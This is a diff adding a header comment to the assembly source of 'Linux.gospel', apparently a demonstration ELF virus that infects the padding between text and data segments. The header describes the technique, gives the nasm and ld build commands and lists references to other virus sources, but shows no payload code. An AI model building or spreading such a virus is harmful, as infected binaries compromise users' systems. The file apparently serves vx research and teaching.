@@ -1,5 +1,147 @@
 BITS 64
 
+;*******************************************************************************
+; ********************
+; Linux.gospel
+; Written by ic3qu33n
+; ********************
+;
+; gospel is a Linux virus that implements the text segment padding technique 
+; created by Silvio Cesare (aka silvio) and documented in his articles 
+; “UNIX viruses” [1] and “UNIX ELF Parasites and virus” [2].
+; gospel is an ELF infector that adds its viral payload to the region 
+; reserved for padding bytes between the .text segment and the .data segment. 
+; It relies on the use of padding bytes between segments as a page-aligned 
+; region of available memory.
+;
+;
+; This demo virus is created as the accompaniment to my article 
+; “u used 2 call me on my polymorphic shell phone, pt. 1:  
+;  gospel for a new epoch”
+; to be released in tmp.0ut volume 3.
+;
+; **********************
+; Primary vx references
+; **********************
+; The primary vx resources that I referenced while writing this virus 
+; are the following 
+; (also listed with the same reference numbers in the References section 
+; for consistency):
+; [2] “UNIX ELF Parasites and virus,” Silvio Cesare, October 1998  
+; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm 
+;
+;
+; [4b]“VIT Virus: VIT source,” Silvio Cesare, October 1998,  
+; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
+; (navigate to it from this page; I’m not putting the link to the tarball 
+; here so you don't accidentally download it. yw.)
+;
+; [13] “Skeksi virus,” elfmaster
+; https://github.com/elfmaster/skeksi_virus 
+;
+;
+; [14] “Linux.Nasty.asm,” TMZ, 2021, tmp.0ut, volume 1
+; https://tmpout.sh/1/Linux.Nasty.asm 
+;
+;
+; ************************
+; How to assemble gospel:
+; ************************
+;
+;The Makefile in this repo can be used to assemble gospel.
+; Alternatively, to assemble gospel, you will need
+; i. nasm
+; ii. an x86_64 GNU linker 
+;
+; Note: I used x86_64-linux-gnu-ld on an aarch64 Kali vm: 
+; Debian 6.5.3-1kali1 (2023-09-19) aarch64 GNU/Linux
+; This was a good option for me since I needed a cross-compiler 
+; toolchain for my dev env, 
+; but feel free to use your favorite compatible linker
+;
+; To assemble, use the following command:
+;
+; nasm -f elf64 gospel.asm -o gospel.o && x86_64-linux-gnu-ld gospel.o -o gospel
+;
+;
+;
+; ************************
+; greetz <3
+; ************************
+; Everyone on the tmp.0ut team 
+; Extra special shoutouts+thank yous to netspooky and sblip for all their support&feedback on this project! 
+; Silvio (Silvio if you read this then, hello! I love your work!)
+; elfmaster and TMZ for your amazing Linux vx
+; Travisgoodspeed
+; richinseattle, jduck, botvx, mrphrazer, lauriewired
+; zeta, dnz, srsns, xcellerator, bane, h0wdy, gren, museifu, domino, 0daysimpson
+;
+;
+; Everyone in the slop pit and all my homies near + far
+; ilysm xoxoxoxoxoxxo
+;
+;
+; *********************************
+; References:
+; *********************************
+; 
+; [1] “Unix Viruses,” Silvio Cesare, 
+; https://web.archive.org/web/20020604060624/http://www.big.net.au/~silvio/unix-viruses.txt  
+; [2] “UNIX ELF Parasites and virus,” Silvio Cesare, October 1998,
+; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm 
+; 
+; [3 — same as 1, different URL] “UNIX Viruses” Silvio Cesare, October 1998
+; https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix01.htm 
+; 
+; [4] “The VIT(Vit.4096) Virus,” Silvio Cesare, October 1998
+; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
+; 
+; [4a]“VIT Virus: VIT description,” Silvio Cesare, October 1998
+; https://web.archive.org/web/20020228014729/http://www.big.net.au/~silvio/vit.txt 
+; 
+; [4b]“VIT Virus: VIT source,” Silvio Cesare, October 1998,  
+; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
+; (navigate to it from this page; I’m not putting the link to the tarball here 
+; so u don't accidentally download it. yw.)
+; 
+; [5] “Shared Library Call Redirection via ELF PLT Infection”, Silvio Cesare, 
+; Phrack, Volume 0xa Issue 0x38, 
+; 05.01.2000, 0x07[0x10],  http://phrack.org/issues/56/7.html#article 
+; 
+; [6] “Getdents.old.att”
+; Github: Jamichaels (sblip),
+; https://gist.github.com/jamichaels/fd6bca66879da9ec0efe 
+; 
+; [7] "ASM Tutorial for Linux n' ELF file format", BY LiTtLe VxW, 29A issue #8
+; 
+; [8] “Linux virus writing tutorial” [v1.0 at xx/12/99], by mandragore, 
+; from Feathered Serpents, 29A issue #4
+; 
+; [9] “Half virus: Linux.A.443,” Pavel Pech (aka TheKing1980), 03/02/2002, 
+; 29A issue #6
+; 
+; [10] “Linux Mutation Engine (source code) [LiME] Version: 0.2.0,” 
+; written by zhugejin at Taipei, Taiwan; 
+; Date: 2000/10/10, Last update: 2001/02/28, 29A issue #6
+; 
+; [11] “Win32/Linux.Winux”, by Benny/29A, 29A issue #6
+; 
+; [12] “Metamorphism in practice or How I made MetaPHOR and what I've learnt”, 
+; by The Mental Driller/29A, 29A issue #6
+; 
+; [13] “Skeksi virus,” elfmaster
+; https://github.com/elfmaster/skeksi_virus 
+; 
+; 
+; [14] “Linux.Nasty.asm,” TMZ, 2021, tmp.0ut, volume 1
+; https://tmpout.sh/1/Linux.Nasty.asm
+; 
+; [15] “Linux.Nasty.asm,” TMZ, 2021,
+; https://www.guitmz.com/linux-nasty-elf-virus/ 
+;  
+;*******************************************************************************
+
+
 section .bss
 	struc linuxdirent
 		.d_ino:			resq 1
